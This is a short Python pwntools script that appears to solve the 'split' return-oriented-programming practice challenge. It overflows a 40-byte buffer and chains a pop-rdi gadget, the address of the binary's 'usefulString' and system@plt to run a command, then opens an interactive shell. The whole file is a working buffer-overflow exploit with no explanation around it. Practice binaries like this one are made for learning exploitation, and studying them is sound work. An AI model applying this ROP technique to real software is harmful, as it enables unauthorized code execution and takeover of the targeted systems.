import os
from pwn import *

payload = 'A' * 40          # offset
gg = 0x0000000000400883     # pop edi;ret

elf = ELF('./split')

payload += p64(gg)
payload += p64(elf.symbols['usefulString'])
payload += p64(elf.plt['system'])


r = process('./split')

r.recvuntil('>')
r.sendline(payload)
r.interactive()
